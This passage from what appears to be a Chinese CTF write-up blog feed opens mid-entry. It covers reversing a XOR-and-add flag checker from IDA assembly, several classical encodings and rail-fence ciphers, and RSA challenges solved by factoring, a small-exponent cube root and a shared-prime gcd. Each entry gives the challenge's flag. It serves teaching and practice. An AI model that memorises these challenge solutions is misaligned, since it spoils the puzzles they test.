class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401550 push rbp </span><br><span class="line">.text:0000000000401551 mov rbp, rsp </span><br><span class="line">.text:0000000000401554 sub rsp, 90h </span><br><span class="line">.text:000000000040155B call __main</span><br><span class="line">#对应伪代码</span><br><span class="line">int main() &#123; </span><br><span class="line">// 保存旧的栈帧指针，设置新的栈帧，为局部变量分配空间 </span><br><span class="line">// push rbp; mov rbp, rsp; sub rsp, 90h </span><br><span class="line">// 调用初始化函数（可能是C标准库的初始化） </span><br><span class="line">__main();</span><br><span class="line"></span><br><span class="line">.text:0000000000401560 lea rcx, Buffer ;&quot;input your flag:&quot; </span><br><span class="line">.text:0000000000401567 call puts</span><br><span class="line">#对应伪代码</span><br><span class="line">puts(&quot;input your flag:&quot;);</span><br><span class="line"></span><br><span class="line">.text:000000000040156C lea rax, [rbp+Str] .text:0000000000401570 mov rdx, rax .text:0000000000401573 lea rcx, Format ; &quot;%s&quot; .text:000000000040157A call scanf</span><br><span class="line">#对应伪代码</span><br><span class="line">// 读取用户输入到局部变量Str中 </span><br><span class="line">char Str[/* 大小取决于栈空间分配 */]; </span><br><span class="line">scanf(&quot;%s&quot;, Str);</span><br><span class="line"></span><br><span class="line">.text:000000000040157F lea rax, [rbp+Str] .text:0000000000401583 mov rcx, rax ; Str .text:0000000000401586 call strlen .text:000000000040158B cmp rax, 23h ; &#x27;#&#x27; .text:000000000040158F jz short loc_40159B .text:0000000000401591 mov eax, 0 .text:0000000000401596 jmp loc_40162B</span><br><span class="line">#对应伪代码</span><br><span class="line">// 检查输入长度是否为35(0x23) </span><br><span class="line">if (strlen(Str) != 35) &#123; </span><br><span class="line">return 0; // 长度不符则退出 </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.text:000000000040159B mov [rbp+var_4], 0 ; i = 0 .text:00000000004015A2 loc_4015A2: ; 循环开始 .text:00000000004015A2 cmp [rbp+var_4], 22h ; i &lt;= 34? </span><br><span class="line">.text:00000000004015A6 jg short loc_40161A .text:00000000004015A8 mov eax, [rbp+var_4] .text:00000000004015AB cdqe ; 符号扩展 .text:00000000004015AD movzx eax, [rbp+rax+Str] ; 取Str[i] </span><br><span class="line">.text:00000000004015B2 xor eax, 52h ; Str[i] ^= 0x52 #xor异或运算</span><br><span class="line">.text:00000000004015B5 mov edx, eax .text:00000000004015B7 mov eax, [rbp+var_4] .text:00000000004015BA cdqe .text:00000000004015BC mov [rbp+rax+Str], dl ; 写回Str[i] </span><br><span class="line">.text:00000000004015C0 mov eax, [rbp+var_4] .text:00000000004015C3 cdqe .text:00000000004015C5 movzx eax, [rbp+rax+Str] .text:00000000004015CA add eax, 5 ; Str[i] += 5 .text:00000000004015CD mov edx, eax .text:00000000004015CF mov eax, [rbp+var_4] .text:00000000004015D2 cdqe .text:00000000004015D4 mov [rbp+rax+Str], dl ; 写回Str[i]</span><br><span class="line">#对应伪代码</span><br><span class="line">// 初始化循环变量i=0 </span><br><span class="line">int i = 0; </span><br><span class="line">// 循环处理每个字符，直到i &gt; 34 (0x22) </span><br><span class="line">while (i &lt;= 34) &#123; </span><br><span class="line">// 对Str[i]进行变换：先异或0x52 </span><br><span class="line">Str[i] ^= 0x52; </span><br><span class="line">Str[i] += 5;// 再加上5</span><br><span class="line"></span><br><span class="line">.text:00000000004015D8 mov eax, [rbp+var_4] .text:00000000004015DB cdqe .text:00000000004015DD movzx eax, [rbp+rax+Str] .text:00000000004015E2 movsx eax, al ; 符号扩展 .text:00000000004015E5 mov edx, [rbp+var_4] .text:00000000004015E8 movsxd rdx, edx .text:00000000004015EB lea rcx, ds:0[rdx*4] ; hint[i*4]? </span><br><span class="line">.text:00000000004015F3 lea rdx, res ; 可能是hint数组基址 </span><br><span class="line">.text:00000000004015FA mov edx, [rcx+rdx] ; 取hint[i] </span><br><span class="line">.text:00000000004015FD cmp eax, edx ; 比较Str[i]与hint[i] </span><br><span class="line">.text:00000000004015FF jz short loc_401614 ; 相等则继续 </span><br><span class="line">.text:0000000000401601 lea rcx, aWrong ; &quot;Wrong!&quot; .text:0000000000401608 call puts .text:000000000040160D mov eax, 0 .text:0000000000401612 jmp short loc_40162B</span><br><span class="line">#对应伪代码</span><br><span class="line">// 检查变换后的Str[i]是否等于hint[i] </span><br><span class="line">if (Str[i] != hint[i]) &#123; </span><br><span class="line">puts(&quot;Wrong!&quot;); // 不相等则输出错误信息 </span><br><span class="line">return 0; // 并退出程序 </span><br><span class="line">&#125; </span><br><span class="line">i++; // 循环变量递增 </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.text:000000000040161A loc_40161A: ; 循环结束后执行 .text:000000000040161A lea rcx, aGood ; &quot;Good!&quot; .text:0000000000401621 call puts .text:0000000000401626 mov eax, 0</span><br><span class="line">#对应伪代码</span><br><span class="line">// 所有字符验证通过，输出&quot;Good!&quot; </span><br><span class="line">puts(&quot;Good!&quot;); </span><br><span class="line">return 0;</span><br><span class="line"></span><br><span class="line">.text:000000000040162B loc_40162B: .text:000000000040162B add rsp, 90h ; 释放局部变量空间 </span><br><span class="line">.text:0000000000401632 pop rbp ; 恢复旧的栈帧指针 .text:0000000000401633 retn ; 返回</span><br><span class="line">#对应伪代码</span><br><span class="line">// 函数结束，栈帧恢复 </span><br><span class="line">&#125; // 对应main函数结束</span><br></pre></td></tr></table></figure><p><strong>总结</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">char Str[/* 长度动态 */]; </span><br><span class="line">printf(&quot;input your flag:&quot;); // puts(&quot;input your flag:&quot;) </span><br><span class="line">scanf(&quot;%s&quot;, Str); // 读取用户输入到 Str </span><br><span class="line">if (strlen(Str) != 0x23) &#123; // 0x23 = 35，检查输入长度是否为 35 </span><br><span class="line">printf(&quot;Wrong!&quot;); // 长度不对直接报错 </span><br><span class="line">return 0; </span><br><span class="line">&#125;</span><br><span class="line">// 第一步：异或 0x52 </span><br><span class="line">Str[i] ^= 0x52; </span><br><span class="line">// 第二步：加 5 </span><br><span class="line">Str[i] += 5; </span><br><span class="line">// 第三步：与 hint 数组对比 </span><br><span class="line">if (Str[i] != hint[i]) &#123; </span><br><span class="line">printf(&quot;Wrong!&quot;); </span><br><span class="line">return 0; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="解题思路：逆向推导-Flag"><a href="#解题思路：逆向推导-Flag" class="headerlink" title="解题思路：逆向推导 Flag"></a>解题思路：逆向推导 Flag</h3><p>已知 <code>hint</code> 数组，需<strong>反向推导原始输入 <code>Str</code></strong>（即 Flag ）。<br>逆向推导原始 <code>Str[i]</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Str[i] = (hint[i] - 5) ^ 0x52  </span><br></pre></td></tr></table></figure><p><strong>编写逆向计算脚本</strong><br>用 Python 反向推导每个 <code>Str[i]</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hint = [<span class="number">0x21</span>,<span class="number">0x6</span>,<span class="number">0x6</span>,<span class="number">0x16</span>,<span class="number">0xb</span>,<span class="number">0x19</span>,<span class="number">0x2e</span>,<span class="number">0x65</span>,<span class="number">0x35</span>,<span class="number">0x6a</span>,<span class="number">0x6f</span>,<span class="number">0x38</span>,<span class="number">0x36</span>,<span class="number">0x84</span>,<span class="number">0x70</span>,<span class="number">0x3b</span>,<span class="number">0x39</span>,<span class="number">0x65</span>,<span class="number">0x38</span>,<span class="number">0x35</span>,<span class="number">0x84</span>,<span class="number">0x6f</span>,<span class="number">0x36</span>,<span class="number">0x3c</span>,<span class="number">0x6a</span>,<span class="number">0x38</span>,<span class="number">0x68</span>,<span class="number">0x84</span>,<span class="number">0x66</span>,<span class="number">0x70</span>,<span class="number">0x3b</span>,<span class="number">0x38</span>,<span class="number">0x6a</span>,<span class="number">0x36</span>,<span class="number">0x34</span>]</span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> h <span class="keyword">in</span> hint:</span><br><span class="line">    temp = (h - <span class="number">5</span>) ^ <span class="number">0x52</span> <span class="comment">#逆向计算:先减5,再异或 0x52</span></span><br><span class="line">    flag.append(<span class="built_in">chr</span>(temp))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(flag))<span class="comment"># 拼接字符得到 Flag</span></span><br></pre></td></tr></table></figure><p>NSSCTF{2b78ac-9df2ab-8ce7a1-39da7c}</p>]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
          <category> 汇编 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ascii</title>
      <link href="/2025/06/4ae6af308ca1.html"/>
      <url>/2025/06/4ae6af308ca1.html</url>
      
        <content type="html"><![CDATA[<p>54 5a 43 46 6c 61 67 7b 48 65 6c 6c 6f 5f 41 53 43 49 49 7d<br><img src="/images/D49E689A-C316-4E38-8BC3-7F6155521A10.png"></p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 常见编码 </category>
          
          <category> ASCII编码 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Quoted-printable</title>
      <link href="/2025/06/898b6c6144d9.html"/>
      <url>/2025/06/898b6c6144d9.html</url>
      
        <content type="html"><![CDATA[<p>&#x3D;E9&#x3D;82&#x3D;A3&#x3D;E4&#x3D;BD&#x3D;A0&#x3D;E4&#x3D;B9&#x3D;9F&#x3D;E5&#x3D;BE&#x3D;88&#x3D;E6&#x3D;A3&#x3D;92&#x3D;E5&#x3D;93&#x3D;A6<br>原理是没有等号就把英文、数字等原样输出，等号加两个十六进制数代表一个非 Ascii 码范围的字符（如汉字）或特殊字符。<br><img src="/images/Pastedimage20250601184509.png"></p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 常见编码 </category>
          
          <category> Quoted-printable编码 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Tap tap</title>
      <link href="/2025/06/d953a328927b.html"/>
      <url>/2025/06/d953a328927b.html</url>
      
        <content type="html"><![CDATA[<p>小明最近在追《疑犯追凶》，在第二季结尾的时候出现了这么一张图片，他却没看懂啥意思，你能帮帮他吗 flag格式为TZCFlag{xxxx},xxxx全大写<br><img src="/images/tapcode.webp"></p><ul><li><code>44</code> 对应字母 <code>T</code> 。</li><li><code>42</code> 对应字母 <code>R</code> 。</li><li><code>11</code> 对应字母 <code>A</code> 。</li><li><code>24</code> 对应字母 <code>I</code> 。</li><li><code>33</code> 对应字母 <code>N</code> 。</li><li><code>43</code> 对应字母 <code>S</code> 。</li><li><code>44</code> 对应字母 <code>T</code> 。</li><li><code>33</code> 对应字母 <code>N</code> 。<br>TZCFlag{TRAINSTN}</li></ul>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 常见编码 </category>
          
          <category> 敲击码(Tap code) </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>原理</title>
      <link href="/2025/06/55b5fee0b6cc.html"/>
      <url>/2025/06/55b5fee0b6cc.html</url>
      
        <content type="html"><![CDATA[<p>&#x3D;&#x3D;<strong>加密</strong>&#x3D;&#x3D;<br>当加密为两组时，把将要传递的信息中的字母交替排成上下两行。</p><p>再将下面一行字母排在上面一行的后边，从而形成一段密码。</p><p>例如：加密明文。<br><strong><em>ALL LIFE IS A GAME OF LUCK</em></strong></p><p>当加密为两组时，将句子从上往下交替写成两行，也就是第一 三 五等奇数个字母作为第一组，第二四六作为第二组。</p><p><strong><em>ALIESGMOLC</em></strong></p><p><strong><em>LLFIAAEFUK</em></strong></p><p>再将第一组放在第二组前</p><p><em><strong>ALIESGMOLCLLFIAAEFUK</strong></em></p><p>加密完成。</p><p>&#x3D;&#x3D;<strong>解 密</strong>&#x3D;&#x3D;<br>第一步将密文按组分开。当密文字母个数为奇数个时，第一组比第二组多一个。<br>第二步自上向下读出。 </p><p>举例：<br>密文：<em><strong>TMKECDYONOAEAHACUT</strong></em></p><p>密文字母个数为18，第一组9个字母，第二组9个字母。</p><p><em><strong>TMKECDYON</strong></em><br><em><strong>OAEAHACUT</strong></em></p><p>自上向下读出：<em><strong>TOMAKEEACHDAYCOUNT</strong></em></p><p>得明文：<em><strong>TO MAKE EACH DAY COUNT</strong></em></p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 换位密码 </category>
          
          <category> 栅栏密码 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>篱笆墙的影子</title>
      <link href="/2025/06/d3e8b0c9d849.html"/>
      <url>/2025/06/d3e8b0c9d849.html</url>
      
        <content type="html"><![CDATA[<p>felhaagv{ewtehtehfilnakgw}</p><p>看这个felhaag，flag在里面很明显，最后一位是} 。<br>分成两组<br>f l a g { w e t h i n k w<br>e h a v e t h e f l a g }<br>这就是加密<br>flag{wethinkwehavetheflag}<br><a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php">https://www.qqxiuzi.cn/bianma/zhalanmima.php</a>            [在线栅栏加解密]</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 换位密码 </category>
          
          <category> 栅栏密码 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>原理</title>
      <link href="/2025/06/54ed00852af2.html"/>
      <url>/2025/06/54ed00852af2.html</url>
      
        <content type="html"><![CDATA[<h3 id="编码规则"><a href="#编码规则" class="headerlink" title="编码规则"></a>编码规则</h3><p>将字母表排列成 5×5 的矩阵（C和K共用一格 ） ，如下：<br>|<img src="/images/Pastedimage20250603134130.png"></p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 常见编码 </category>
          
          <category> 敲击码(Tap code) </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>c,n,e</title>
      <link href="/2025/06/4c96d1aad14e.html"/>
      <url>/2025/06/4c96d1aad14e.html</url>
      
        <content type="html"><![CDATA[<p>c &#x3D; 566134289175001073338056659296498386641704313655869270504728356324933522811329068806508523532229682163525391220524802986785979422224911403071360548998101883993096018419857810663495564026562659363871989824162135535273717970285889221585901801835578256566036552604952749911282130835836581634840314211017046826426109774890418389574576128514071616464686335314358612894449871297012320880991577385456512998134643750537355527145843861005150574206728763965567156607610158050662833497593328881837388826744959143787862030176066778562928676173698618553745217799573433348833221151549888811871451808452955305602107063553259177528973779863154453333102822257682773411954333494475389886363107483562321532979964779714092494561759919711378961571336972685333275022586113138145007123147423870377012703192994633879942428704057951403358824692549839968488524015173505870905889600039037750913144895609595459004953371070240801671011997833228707676492818822464352241156584093362459311507045539329339058073049976087255850541570728786975634641284864343466456814506387776441995199436103111145990444660701184107235574238419914669387830626551319768539563036924648893943101966787768445626547186646731973307521638141189845168175085035920200073130311681615711143905321<br>n &#x3D; 966808932627497190635859236054960349099463975227350564265384373280336699853387254070662881265937565163000758606154308757944030571837175048514574473061401566330836334647176655282619268592560172726526643074499534129878217409046045533656897050117438496357231575999185527675071002803951800635220029015932007465117818739948903750200830856115668691007706836952244842719419452946259275251773298338162389930518838272704908887016474007051397194588396039111216708866214614779627566959335170676055025850932631053641576566165694121420546081043285806783239296799795655191121966377590175780618944910532816988143056757054052679968538901460893571204904394975714081055455240523895653305315517745729334114549756695334171142876080477105070409544777981602152762154610738540163796164295222810243309051503090866674634440359226192530724635477051576515179864461174911975667162597286769079380660782647952944808596310476973939156187472076952935728249061137481887589103973591082872988641958270285169650803792395556363304056290077801453980822097583574309682935697260204862756923865556397686696854239564541407185709940107806536773160263764483443859425726953142964148216209968437587044617613518058779287167853349364533716458676066734216877566181514607693882375533<br>e &#x3D; 65537</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from sympy import factorint</span><br><span class="line">from sympy import mod_inverse</span><br><span class="line">n = 966808932627497190635859236054960349099463975227350564265384373280336699853387254070662881265937565163000758606154308757944030571837175048514574473061401566330836334647176655282619268592560172726526643074499534129878217409046045533656897050117438496357231575999185527675071002803951800635220029015932007465117818739948903750200830856115668691007706836952244842719419452946259275251773298338162389930518838272704908887016474007051397194588396039111216708866214614779627566959335170676055025850932631053641576566165694121420546081043285806783239296799795655191121966377590175780618944910532816988143056757054052679968538901460893571204904394975714081055455240523895653305315517745729334114549756695334171142876080477105070409544777981602152762154610738540163796164295222810243309051503090866674634440359226192530724635477051576515179864461174911975667162597286769079380660782647952944808596310476973939156187472076952935728249061137481887589103973591082872988641958270285169650803792395556363304056290077801453980822097583574309682935697260204862756923865556397686696854239564541407185709940107806536773160263764483443859425726953142964148216209968437587044617613518058779287167853349364533716458676066734216877566181514607693882375533</span><br><span class="line"></span><br><span class="line"># 分解 n</span><br><span class="line">factors = factorint(n)</span><br><span class="line">p, q = factors.keys()</span><br><span class="line">phi_n = (p - 1) * (q - 1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = 566134289175001073338056659296498386641704313655869270504728356324933522811329068806508523532229682163525391220524802986785979422224911403071360548998101883993096018419857810663495564026562659363871989824162135535273717970285889221585901801835578256566036552604952749911282130835836581634840314211017046826426109774890418389574576128514071616464686335314358612894449871297012320880991577385456512998134643750537355527145843861005150574206728763965567156607610158050662833497593328881837388826744959143787862030176066778562928676173698618553745217799573433348833221151549888811871451808452955305602107063553259177528973779863154453333102822257682773411954333494475389886363107483562321532979964779714092494561759919711378961571336972685333275022586113138145007123147423870377012703192994633879942428704057951403358824692549839968488524015173505870905889600039037750913144895609595459004953371070240801671011997833228707676492818822464352241156584093362459311507045539329339058073049976087255850541570728786975634641284864343466456814506387776441995199436103111145990444660701184107235574238419914669387830626551319768539563036924648893943101966787768445626547186646731973307521638141189845168175085035920200073130311681615711143905321</span><br><span class="line">e = 65537</span><br><span class="line">d = mod_inverse(e, phi_n)</span><br><span class="line">m = pow(c, d, n) </span><br><span class="line">def num_to_ascii(m):</span><br><span class="line">    m_bytes = m.to_bytes((m.bit_length() + 7) // 8, byteorder=&#x27;big&#x27;)</span><br><span class="line">    return m_bytes.decode(&#x27;utf-8&#x27;)</span><br><span class="line"></span><br><span class="line">flag = num_to_ascii(m)</span><br><span class="line">print(f&quot;flag = &#123;flag&#125;&quot;)</span><br></pre></td></tr></table></figure><p> flag&#x3D;TZCFlag{factor_is_so_easy}<br><img src="/images/Pastedimage20250603143451.png"></p><hr><p>n &#x3D; 0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793<br>e &#x3D; 3  <strong>&#x3D;&#x3D;当e较小时则可直接通过开立方根得到明文&#x3D;&#x3D;</strong><br>c &#x3D; 6021062141588965841587167293</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">n = 0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793</span><br><span class="line">e = 3</span><br><span class="line">c = 6021062141588965841587167293</span><br><span class="line"></span><br><span class="line"># 计算立方根</span><br><span class="line">m = round(c ** (1/3))</span><br><span class="line">if pow(m, 3) == c:</span><br><span class="line">    print(&quot;明文整数:&quot;, m)</span><br><span class="line">    flag = m.to_bytes((m.bit_length() + 7) // 8, byteorder=&#x27;big&#x27;).decode(&#x27;ascii&#x27;)</span><br><span class="line">    print(&quot;Flag:&quot;, flag)</span><br><span class="line">else:</span><br><span class="line">    print(&quot;无法通过低指数攻击破解&quot;)</span><br></pre></td></tr></table></figure><p>明文整数: 1819244357<br>Flag: lowE<br>TZCFlag{lowE}</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 非对称加密（Asymmetric Cryptography） </category>
          
          <category> RSA </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>n1,n2,e,c共享素因数</title>
      <link href="/2025/06/6f67f52f7ab4.html"/>
      <url>/2025/06/6f67f52f7ab4.html</url>
      
        <content type="html"><![CDATA[<p>n1&#x3D;9051013965404084482870087864821455535159008696042953021965631089095795348830954383127323853272528967729311045179605407693592665683311660581204886571146327720288455874927281128121117323579691204792399913106627543274457036172455814805715668293705603675386878220947722186914112990452722174363713630297685159669328951520891938403452797650685849523658191947411429068829734053745180460758604283051344339641429819373112365211739216160420494167071996438506850526168389386850499796102003625404245645796271690310748804327<br>n2&#x3D;13225948396179603816062046418717214792668512413625091569997524364243995991961018894150059207824093837420451375240550310050209398964506318518991620142575926623780411532257230701985821629425722030608722035570690474171259238153947095310303522831971664666067542649034461621725656234869005501293423975184701929729170077280251436216167293058560030089006140224375425679571181787206982712477261432579537981278055755344573767076951793312062480275004564657590263719816033564139497109942073701755011873153205366238585665743<br>e &#x3D; 65537<br>c &#x3D; 268065307799668245100155583656026011160002952385077142247208270849202533959057073328593124609246618255434974771312005129546891196910224298782988830299931466177092252318898389606108682805827112298601665236639013976557584096409090034724959181393317682380243407722802135226000120577664046248111234520151522261820924236477640240403636122092626752359753454045971441763375027128396562369686719452592987407716592442173485676980456821015690717339269128488747739318128952772386390939524794974383676486458446499596610588</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">from math import gcd </span><br><span class="line">from sympy import mod_inverse </span><br><span class="line">n1 = 9051013965404084482870087864821455535159008696042953021965631089095795348830954383127323853272528967729311045179605407693592665683311660581204886571146327720288455874927281128121117323579691204792399913106627543274457036172455814805715668293705603675386878220947722186914112990452722174363713630297685159669328951520891938403452797650685849523658191947411429068829734053745180460758604283051344339641429819373112365211739216160420494167071996438506850526168389386850499796102003625404245645796271690310748804327 </span><br><span class="line">n2 = 13225948396179603816062046418717214792668512413625091569997524364243995991961018894150059207824093837420451375240550310050209398964506318518991620142575926623780411532257230701985821629425722030608722035570690474171259238153947095310303522831971664666067542649034461621725656234869005501293423975184701929729170077280251436216167293058560030089006140224375425679571181787206982712477261432579537981278055755344573767076951793312062480275004564657590263719816033564139497109942073701755011873153205366238585665743</span><br><span class="line">c = 268065307799668245100155583656026011160002952385077142247208270849202533959057073328593124609246618255434974771312005129546891196910224298782988830299931466177092252318898389606108682805827112298601665236639013976557584096409090034724959181393317682380243407722802135226000120577664046248111234520151522261820924236477640240403636122092626752359753454045971441763375027128396562369686719452592987407716592442173485676980456821015690717339269128488747739318128952772386390939524794974383676486458446499596610588 </span><br><span class="line"></span><br><span class="line">e = 65537 </span><br><span class="line"></span><br><span class="line">p = gcd(n1, n2) # 计算gcd(n1, n2) </span><br><span class="line"></span><br><span class="line">if p &gt; 1: </span><br><span class="line">print(f&quot;发现共享素因数 p = &#123;p&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># 计算另一个素因数 </span><br><span class="line">q1 = n1 // p </span><br><span class="line">q2 = n2 // p </span><br><span class="line"></span><br><span class="line"># 计算φ(n) </span><br><span class="line">phi_n1 = (p - 1) * (q1 - 1) </span><br><span class="line">phi_n2 = (p - 1) * (q2 - 1) </span><br><span class="line"></span><br><span class="line"># 计算私钥d </span><br><span class="line">d1 = mod_inverse(e, phi_n1) </span><br><span class="line">d2 = mod_inverse(e, phi_n2) </span><br><span class="line"></span><br><span class="line"># 解密 </span><br><span class="line">m1 = pow(c, d1, n1) </span><br><span class="line">m2 = pow(c, d2, n2) </span><br><span class="line"></span><br><span class="line"># 转换为ASCII </span><br><span class="line">def num_to_ascii(m):</span><br><span class="line">m_bytes = m.to_bytes((m.bit_length() + 7) // 8, byteorder=&#x27;big&#x27;) </span><br><span class="line">return   m_bytes.decode(&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;) </span><br><span class="line">flag1 = num_to_ascii(m1)</span><br><span class="line">flag2 = num_to_ascii(m2) </span><br><span class="line">print(f&quot;flag1 = &#123;flag1&#125;&quot;) </span><br><span class="line">print(f&quot;flag2 = &#123;flag2&#125;&quot;)</span><br><span class="line">else: </span><br><span class="line">print(&quot;未发现共享素因数，需要其他方法分解模数&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>发现共享素因数 p &#x3D; 1564859779720039565508870182569324208117555667917997801104862601098933699462849007879184203051278194180664616470669559575370868384820368930104560074538872199213236203822337186927275879139590248731148622362880471439310489228147093224418374555428793546002109</p><p>flag1 &#x3D; TZCFlag{I_love_rsa}</p><p>flag2 &#x3D; SN96LdJnS}%?;Z#:n,zzpQ4&#96;9Jv#a?MZ”HZHj</p><p>q审_Pd,&#x3D;R&lt;w^y(iGma,84&gt;uԌUE!t&#x3D;턢u’Q9ݩ}g<br>2.H*~Sm:!eDA</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 非对称加密（Asymmetric Cryptography） </category>
          
          <category> RSA </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>p,q,e</title>
      <link href="/2025/06/ca93d03320bb.html"/>
      <url>/2025/06/ca93d03320bb.html</url>
      
        <content type="html"><![CDATA[<p>在一次RSA密钥对生成中，假设p&#x3D;473398607161，q&#x3D;4511491，e&#x3D;17<br>求解出d作为flga提交</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">p=473398607161</span><br><span class="line">q=4511491</span><br><span class="line">e=17</span><br><span class="line">z=(p-1)*(q-1) #欧拉函数</span><br><span class="line">d = pow(e, -1, z) #(e * d) % z == 1 </span><br><span class="line">#m = pow(c, d, n)</span><br><span class="line">print(d)</span><br></pre></td></tr></table></figure><p>or</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">p = 473398607161 </span><br><span class="line">q = 4511491 </span><br><span class="line">e = 17 </span><br><span class="line">z = (p - 1) * (q - 1) </span><br><span class="line">d = gmpy2.invert(e, z) # e*d mod z = 1</span><br><span class="line">print(d)</span><br></pre></td></tr></table></figure><p><img src="/images/398FE444-FE62-474E-8333-9D51EDA83FEB.png"><br>右键<br><img src="/images/Pastedimage20250603090548.png"><br>125631357777427553</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 非对称加密（Asymmetric Cryptography） </category>
          
          <category> RSA </category>
          
      </categories>
      
      
    </entry>
    
    
